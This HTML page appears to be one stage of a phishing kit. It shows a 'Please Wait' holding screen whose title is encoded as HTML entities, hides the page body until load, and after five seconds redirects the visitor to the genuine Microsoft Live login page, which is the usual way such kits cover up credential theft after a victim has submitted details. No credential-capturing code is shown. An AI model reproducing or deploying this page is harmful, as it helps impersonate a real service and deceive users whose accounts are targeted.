<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1501462420&rver=6.7.6643.0&wp=MBI_SSL_SHARED&wreply=https:%2F%2Fmail.live.com%2Fdefault.aspx&lc=1033&id=64855&mkt=en-us&cbcxt=mai"></html>
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:447px; top:31px; width:372px; height:186px; z-index:0"><img src="images/ff4.png" alt="" title="" border=0 width=372 height=186></div>

<div id="image2" style="position:absolute; overflow:hidden; left:481px; top:564px; width:299px; height:60px; z-index:1"><img src="images/ff5.png" alt="" title="" border=0 width=299 height=60></div>

<div id="image3" style="position:absolute; overflow:hidden; left:481px; top:569px; width:295px; height:15px; z-index:2"><a href="#"><img src="images/terms.png" alt="" title="" border=0 width=295 height=15></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:561px; top:310px; width:128px; height:128px; z-index:3"><img src="images/of.gif" alt="" title="" border=0 width=128 height=128></div>

</div>

</body>
</html>
